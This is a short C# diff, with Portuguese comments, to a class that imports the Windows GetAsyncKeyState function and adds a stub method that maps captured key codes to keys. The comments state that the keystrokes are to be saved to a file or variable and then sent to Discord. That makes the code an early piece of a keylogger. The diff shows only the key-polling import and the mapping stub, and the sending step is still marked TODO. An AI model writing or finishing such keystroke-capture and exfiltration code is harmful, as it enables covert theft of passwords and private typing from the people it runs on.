@@ -2,21 +2,21 @@
 
 namespace CastApp
 {
-    internal class Natives
+    class Natives
     {
         // Importacao da Api do Windows user32.dll importamos uma funcao chamada GetAsyncKeyState() basicamente ela retorna o valor Decimal de uma Tecla 
         // tem o site da microsoft que nos da os codigos hex das teclas apenas temos que converter o Hex para decimal 
 
         // Site Microsoft: https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
         // Site para converter: https://www.rapidtables.com/convert/number/hex-to-decimal.html
-        [LibraryImport("user32.dll")]
-        public extern int GetAsyncKeyState(Int32 i);
+        [DllImport("user32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
 
         // Criei esta funcao para ser usada no futuro quando pegarmos a tecla precionada verificamos a que tecla corresponde e depois 
         // apenas temos que guardar em um arquivo ou variavel para mandar logo para o Discord fica a vosso criterio
         // TODO
-        // Adicionar o Resto das teclas
-        protected string TeclaPrecionada(int intcode)
+        // Adicionar o resto das teclas
+        public string TeclaPrecionada(int intcode)
         {
             string teclaPrecionada = string.Empty;
 
